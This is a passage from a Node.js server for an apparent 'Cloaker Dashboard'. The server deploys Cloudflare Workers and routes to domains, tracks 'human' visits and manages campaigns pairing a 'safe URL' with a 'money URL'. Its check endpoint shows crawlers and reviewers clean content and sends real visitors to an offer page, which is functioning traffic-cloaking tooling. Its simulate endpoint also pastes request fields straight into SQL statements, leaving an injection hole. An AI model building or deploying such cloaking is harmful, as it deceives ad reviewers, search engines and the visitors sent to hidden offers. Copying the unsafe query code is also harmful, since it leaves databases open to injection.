        log('Token refreshed successfully. Retrying worker upload...', 'step');
        uploadRes = await fetch(`https://api.cloudflare.com/client/v4/accounts/${account}/workers/scripts/${finalWorkerName}`, {
          method: 'PUT',
          headers: { Authorization: `Bearer ${token}` },
          body: createUploadForm()
        });
        uploadData = await uploadRes.json();
      }
    }

    if (!uploadData.success) {
      const err = uploadData.errors?.[0]?.message || 'Worker upload failed';
      log(`Upload failed: ${err}`, 'error');
      return res.status(400).json({ success: false, message: err, logs });
    }
    log(`Worker '${finalWorkerName}' compiled & deployed with [${methodName}]!`, 'success');

    log(`[3/5] Resolving Cloudflare Zone for domain '${cleanSource}'...`, 'step');
    let zoneRes = await fetch(`https://api.cloudflare.com/client/v4/zones?name=${cleanSource}`, {
      headers: { Authorization: `Bearer ${token}` }
    });
    let zoneData = await zoneRes.json();

    if (!zoneData.success || !zoneData.result || zoneData.result.length === 0) {
      const err = `Domain '${cleanSource}' was not found in your Cloudflare zones. Make sure the domain is added to this Cloudflare account.`;
      log(err, 'error');
      return res.status(400).json({ success: false, message: err, logs });
    }

    const zoneId = zoneData.result[0].id;
    log(`Found Zone ID: ${zoneId}`, 'success');

    log(`[4/5] Checking existing Worker routes for ${cleanSource}...`, 'step');
    const routesRes = await fetch(`https://api.cloudflare.com/client/v4/zones/${zoneId}/workers/routes`, {
      headers: { Authorization: `Bearer ${token}` }
    });
    const routesData = await routesRes.json();
    const existingRoutes = routesData.result || [];

    const desiredPatterns = [`${cleanSource}/*`];
    if (includeWww) {
      desiredPatterns.push(`www.${cleanSource}/*`);
    }

    log(`[5/5] Activating route bindings for: ${desiredPatterns.join(', ')}...`, 'step');
    const attachedRoutes = [];

    for (const pattern of desiredPatterns) {
      const match = existingRoutes.find(r => r.pattern.toLowerCase() === pattern.toLowerCase());
      if (match) {
        log(`Updating existing route '${pattern}' -> ${finalWorkerName}...`, 'info');
        const updateRes = await fetch(`https://api.cloudflare.com/client/v4/zones/${zoneId}/workers/routes/${match.id}`, {
          method: 'PUT',
          headers: {
            Authorization: `Bearer ${token}`,
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ pattern, script: finalWorkerName })
        });
        const updateJson = await updateRes.json();
        if (updateJson.success) {
          attachedRoutes.push(pattern);
          log(`Route '${pattern}' active on '${finalWorkerName}'.`, 'success');
        } else {
          log(`Failed to update route '${pattern}': ${updateJson.errors?.[0]?.message}`, 'warning');
        }
      } else {
        log(`Creating new route '${pattern}' -> ${finalWorkerName}...`, 'info');
        const createRes = await fetch(`https://api.cloudflare.com/client/v4/zones/${zoneId}/workers/routes`, {
          method: 'POST',
          headers: {
            Authorization: `Bearer ${token}`,
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ pattern, script: finalWorkerName })
        });
        const createJson = await createRes.json();
        if (createJson.success) {
          attachedRoutes.push(pattern);
          log(`Route '${pattern}' created and bound!`, 'success');
        } else {
          log(`Failed to create route '${pattern}': ${createJson.errors?.[0]?.message}`, 'warning');
        }
      }
    }

    // Save to campaigns history
    const campaigns = loadCampaigns();
    const existingIndex = campaigns.findIndex(c => c.sourceDomain && c.sourceDomain.toLowerCase() === cleanSource);
    const campaignRecord = {
      id: finalWorkerName,
      sourceDomain: cleanSource,
      targetDomain,
      workerName: finalWorkerName,
      activationMethod,
      triggerCondition,
      scrollPct: Math.round(numScrollPct * 100),
      thresholdCount: numThreshold,
      routes: attachedRoutes,
      deployedAt: new Date().toISOString(),
      status: 'active'
    };

    if (existingIndex >= 0) {
      campaigns[existingIndex] = campaignRecord;
    } else {
      campaigns.unshift(campaignRecord);
    }
    saveCampaigns(campaigns);

    // Sync the global config thresholdCount & activationMethod so analytics reflects the deployed value
    const cfgSync = loadConfig();
    cfgSync.thresholdCount = numThreshold;
    cfgSync.activationMethod = activationMethod;
    cfgSync.defaultTrigger = triggerCondition || cfgSync.defaultTrigger;
    saveConfig(cfgSync);

    log(`🎉 Deployment Complete! Cloaker is 100% active on ${cleanSource}`, 'success');

    res.json({
      success: true,
      message: `Successfully deployed ${finalWorkerName} to ${cleanSource} using [${methodName}]!`,
      campaign: campaignRecord,
      logs
    });
  } catch (error) {
    log(`Fatal deployment error: ${error.message}`, 'error');
    res.status(500).json({ success: false, message: error.message, logs });
  }
});

// API: Real-Time 24-Hour Traffic Analytics from Cloudflare D1
app.get('/api/analytics/posts', async (req, res) => {
  const cfg = loadConfig();
  let token = cfg.apiToken;
  const account = cfg.accountId;
  const dbId = cfg.d1DatabaseId || DEFAULT_D1_DATABASE_ID;

  if (!token || !account || !dbId) {
    return res.status(400).json({ success: false, message: 'Cloudflare credentials not configured' });
  }

  try {
    const sql = `
      SELECT 
        post_path, 
        COUNT(*) as total_visits,
        COUNT(DISTINCT visitor_hash) as unique_humans,
        MAX(visited_at) as last_visit,
        GROUP_CONCAT(DISTINCT country) as countries
      FROM url_human_visits 
      WHERE visited_at >= datetime('now', '-24 hours')
      GROUP BY post_path
      ORDER BY total_visits DESC;
      SELECT COUNT(*) as total_visits, COUNT(DISTINCT visitor_hash) as total_unique_humans FROM url_human_visits WHERE visited_at >= datetime('now', '-24 hours');
    `;

    let cfRes = await fetch(`https://api.cloudflare.com/client/v4/accounts/${account}/d1/database/${dbId}/query`, {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${token}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ sql })
    });
    let cfData = await cfRes.json();

    // Auto-refresh token if expired (non-blocking async)
    if (isCfAuthError(cfData, cfRes.status)) {
      const fresh = await getWranglerDefaultsFresh();
      if (fresh.token) {
        token = fresh.token;
        cfRes = await fetch(`https://api.cloudflare.com/client/v4/accounts/${account}/d1/database/${dbId}/query`, {
          method: 'POST',
          headers: {
            Authorization: `Bearer ${token}`,
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ sql })
        });
        cfData = await cfRes.json();
      }
    }

    if (!cfData.success) {
      return res.status(400).json({ success: false, message: cfData.errors?.[0]?.message || 'Query failed' });
    }

    const posts = cfData.result?.[0]?.results || [];
    const totalsRow = cfData.result?.[1]?.results?.[0] || {};
    const exactTotalUniqueHumans = totalsRow.total_unique_humans !== undefined ? totalsRow.total_unique_humans : 0;
    const exactTotalVisits = totalsRow.total_visits !== undefined ? totalsRow.total_visits : 0;
    const threshold = (req.query.threshold ? parseInt(req.query.threshold, 10) : null) || cfg.thresholdCount || 8;

    let activePostsCount = 0;
    let holdingPostsCount = 0;

    posts.forEach(p => {
      const visitCount = p.total_visits !== undefined ? p.total_visits : p.unique_humans;
      p.human_visits = visitCount;
      if (visitCount >= threshold) {
        activePostsCount++;
        p.status = 'active';
      } else {
        holdingPostsCount++;
        p.status = 'holding';
      }
    });

    res.json({
      success: true,
      threshold,
      stats: {
        totalHumans24h: exactTotalVisits,
        totalUniqueHumans24h: exactTotalUniqueHumans,
        totalVisits24h: exactTotalVisits,
        trackedPosts: posts.length,
        activePostsCount,
        holdingPostsCount
      },
      posts
    });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// API: Simulate / Test Human Visit to a URL Path
app.post('/api/analytics/simulate', async (req, res) => {
  const { postPath = '/50-driveway-landscaping-ideas/', count = 1, country = 'US' } = req.body || {};
  const cfg = loadConfig();
  let token = cfg.apiToken;
  const account = cfg.accountId;
  const dbId = cfg.d1DatabaseId || DEFAULT_D1_DATABASE_ID;

  if (!token || !account || !dbId) {
    return res.status(400).json({ success: false, message: 'Cloudflare credentials not configured' });
  }

  try {
    const num = Math.min(Math.max(parseInt(count, 10) || 1, 1), 100);
    const statements = [];
    for (let i = 0; i < num; i++) {
      const randHash = 'sim_' + Math.random().toString(36).substring(2, 15) + '_' + Date.now();
      statements.push(`INSERT INTO url_human_visits (post_path, visitor_hash, visited_at, country) VALUES ('${postPath}', '${randHash}', datetime('now'), '${country}');`);
    }

    let cfRes = await fetch(`https://api.cloudflare.com/client/v4/accounts/${account}/d1/database/${dbId}/query`, {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${token}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ sql: statements.join(' ') })
    });
    let cfData = await cfRes.json();

    if (isCfAuthError(cfData, cfRes.status)) {
      const fresh = await getWranglerDefaultsFresh();
      if (fresh.token) {
        token = fresh.token;
        cfRes = await fetch(`https://api.cloudflare.com/client/v4/accounts/${account}/d1/database/${dbId}/query`, {
          method: 'POST',
          headers: {
            Authorization: `Bearer ${token}`,
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ sql: statements.join(' ') })
        });
        cfData = await cfRes.json();
      }
    }

    res.json({
      success: cfData.success,
      message: `Simulated ${num} human visit(s) to ${postPath}!`,
      details: cfData
    });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// API: Reset / Clear Analytics
app.post('/api/analytics/reset', async (req, res) => {
  const cfg = loadConfig();
  let token = cfg.apiToken;
  const account = cfg.accountId;
  const dbId = cfg.d1DatabaseId || DEFAULT_D1_DATABASE_ID;

  try {
    let cfRes = await fetch(`https://api.cloudflare.com/client/v4/accounts/${account}/d1/database/${dbId}/query`, {
      method: 'POST',
      headers: { Authorization: `Bearer ${token}`, 'Content-Type': 'application/json' },
      body: JSON.stringify({ sql: 'DELETE FROM url_human_visits;' })
    });
    let cfData = await cfRes.json();

    if (isCfAuthError(cfData, cfRes.status)) {
      const fresh = await getWranglerDefaultsFresh();
      if (fresh.token) {
        token = fresh.token;
        cfRes = await fetch(`https://api.cloudflare.com/client/v4/accounts/${account}/d1/database/${dbId}/query`, {
          method: 'POST',
          headers: { Authorization: `Bearer ${token}`, 'Content-Type': 'application/json' },
          body: JSON.stringify({ sql: 'DELETE FROM url_human_visits;' })
        });
        cfData = await cfRes.json();
      }
    }

    res.json({ success: cfData.success, message: 'Analytics database reset successfully' });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// API: Get Campaigns
app.get('/api/campaigns', (req, res) => {
  res.json({ success: true, campaigns: loadCampaigns() });
});

// API: Delete Campaign Route
app.delete('/api/campaigns/:id', async (req, res) => {
  try {
    const id = req.params.id;
    let campaigns = loadCampaigns();
    campaigns = campaigns.filter(c => c.id !== id);
    saveCampaigns(campaigns);
    res.json({ success: true, message: 'Campaign deleted from dashboard history' });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// API: Create Campaign
app.post('/api/campaigns', (req, res) => {
  const { name, safeUrl, moneyUrl, status = 'active' } = req.body || {};

  if (!name || typeof name !== 'string' || !name.trim()) {
    return res.status(400).json({ error: 'Campaign name is required' });
  }
  if (!safeUrl || typeof safeUrl !== 'string' || !safeUrl.trim()) {
    return res.status(400).json({ error: 'Safe URL is required' });
  }
  if (!moneyUrl || typeof moneyUrl !== 'string' || !moneyUrl.trim()) {
    return res.status(400).json({ error: 'Money URL is required' });
  }

  const campaigns = loadCampaigns();
  const id = name.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '') || `campaign-${Date.now()}`;
  const newCampaign = {
    id,
    name: name.trim(),
    safeUrl: safeUrl.trim(),
    moneyUrl: moneyUrl.trim(),
    status: status || 'active',
    createdAt: new Date().toISOString()
  };

  campaigns.unshift(newCampaign);
  saveCampaigns(campaigns);

  res.status(201).json({
    success: true,
    campaign: newCampaign
  });
});

// API: Stats Endpoint
app.get('/api/stats', (req, res) => {
  const campaigns = loadCampaigns();
  res.json({
    status: 'ok',
    totalCampaigns: campaigns.length,
    activeCampaigns: campaigns.filter(c => c.status === 'active').length,
    uptime: process.uptime(),
    timestamp: new Date().toISOString()
  });
});

// Safe & Offer Preview Endpoints
app.get('/safe', (req, res) => {
  res.status(200).send('<!DOCTYPE html><html><head><title>Safe Page</title></head><body><h1>Safe Content</h1><p>Clean original content for reviewers and crawlers.</p></body></html>');
});

app.get('/offer', (req, res) => {
  res.status(200).send('<!DOCTYPE html><html><head><title>Offer Page</title></head><body><h1>Target Offer</h1><p>Active redirection target for validated visitors.</p></body></html>');
});

// Cloaker inspection / simulation endpoint
app.all(['/cloaker/check', '/api/cloaker/check'], (req, res) => {
  const ua = req.headers['user-agent'] || req.query.ua || (req.body && req.body.ua) || '';
  const referer = req.headers['referer'] || req.headers['referrer'] || '';
  const ip = req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for'] || req.ip || '';
  const bot = isBot(ua);
  res.json({
    isBot: bot,
    destination: bot ? '/safe' : '/offer',
    ua,
    referer,
    ip
  });
});

// Catch-all 404 handler for unknown routes
app.use((req, res) => {
  res.status(404).json({ error: 'Not Found' });
});

// Centralized Express Error Handling Middleware
app.use((err, req, res, next) => {
  const status = err.status || err.statusCode || 500;
  res.status(status).json({ error: err.message || 'Internal Server Error' });
});

let server = null;
let isShuttingDown = false;

function startServer(port = PORT) {
  return new Promise((resolve, reject) => {
    let resolved = false;
    const srv = http.createServer(app);

    srv.on('error', (err) => {
      if (err.code === 'EADDRINUSE') {
        console.error(`\n[!] Error: Port ${port} is already in use.`);
        console.error(`[!] Please run start-dashboard.bat which automatically frees port ${port}\n`);
      } else {
        console.error('[!] Server error:', err);
      }
      if (!resolved) {
        resolved = true;
        reject(err);
        if (require.main === module) {
          process.exit(1);
        }
      }
    });

    srv.listen(port, () => {
      if (resolved) return;
      server = srv;
      resolved = true;
      const boundAddress = srv.address();
      const boundPort = boundAddress && typeof boundAddress === 'object' ? boundAddress.port : port;

      console.log(`\n======================================================`);
      console.log(`🚀 Cloaker Dashboard is running!`);
      console.log(`👉 Open: http://localhost:${boundPort}`);
      console.log(`======================================================\n`);

      if (process.env.NODE_ENV !== 'test') {
        verifyCloudflare().then(res => {
          if (res.success) {
            console.log(`[Cloudflare] Pre-verified: ${res.account?.name} (${res.zonesCount} zones)`);
          } else {
            console.log(`[Cloudflare] Pre-verify notice: ${res.message}`);
          }
        }).catch(() => {});
      }
      resolve(srv);
    });

    server = srv;
  });
}

function stopServer() {
  return new Promise((resolve) => {
    if (!server) return resolve();
    if (typeof server.closeAllConnections === 'function') {
      server.closeAllConnections();
    }
    server.close(() => {
      server = null;
      resolve();
    });
  });
}

function handleGracefulShutdown(signal) {
  if (isShuttingDown) return;
  isShuttingDown = true;
  console.log(`\n[Shutdown] Received ${signal}. Closing server and draining connections...`);
  const forceTimer = setTimeout(() => {
    console.error('[Shutdown] Forceful shutdown timeout exceeded. Exiting.');
    process.exit(1);
  }, 5000);
  forceTimer.unref();

  stopServer().then(() => {
    console.log('[Shutdown] Server closed cleanly.');
    process.exit(0);
  }).catch((err) => {
    console.error('[Shutdown] Error during close:', err);
    process.exit(1);
  });
}

if (require.main === module) {
  process.on('SIGINT', () => handleGracefulShutdown('SIGINT'));
  process.on('SIGTERM', () => handleGracefulShutdown('SIGTERM'));

  startServer().catch((err) => {
    console.error('Failed to start server:', err);
    process.exit(1);
  });
}

const serverExport = new Proxy(function() { return server; }, {
  get(target, prop, receiver) {
    if (prop === 'then') return undefined;
    if (server && prop in server) {
      const val = server[prop];
      if (typeof val === 'function') return val.bind(server);
      return val;
    }
    return Reflect.get(target, prop, receiver);
  },
  apply(target, thisArg, argumentsList) {
    return server;
  }
});

module.exports = {
  app,
  server: serverExport,
  startServer,
  stopServer,
  isBot,
  loadConfig,
  saveConfig,
  loadCampaigns,
  saveCampaigns,
  buildWorkerCode,
  buildRobotsTxt
};
